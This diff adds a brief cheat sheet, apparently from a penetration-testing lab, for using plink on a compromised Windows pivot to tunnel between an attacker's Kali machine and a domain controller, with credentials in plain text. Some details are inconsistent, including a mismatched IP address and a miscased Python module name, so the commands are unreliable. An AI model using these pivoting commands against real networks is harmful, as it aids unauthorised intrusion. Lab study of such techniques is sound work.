@@ -1,0 +1,15 @@
+# Forward kali to DC web server
+# On Windows pivot
+plinkx86.exe -ssh -l <kali user> -pw <kali pass> -R <kali ip>:<kali listening port>:<DC ip>:<DC listening port> <kali ip>
+plinkx86.exe -ssh -l kali -pw kali -R 192.168.119.163:8080:172.16.163.5:80 192.168.119.163
+# On kali
+curl http://127.0.0.1:8080
+
+# Forward DC to kali web server
+#On Windows pivot
+plinkx86.exe -ssh -l <kali user> -pw <kali pass> -L <windows pivot ip>:<windows pivot listening port>:<kali ip>:<kali listening ip> <kali ip>
+plinkx86.exe -ssh -l kali -pw kali -L 172.16.163.10:80:192.168.116.163:80 192.168.119.163
+# On Kali
+sudo python -m SimpleHttpServer 80
+# On DC
+Browse to 172.16.163.10
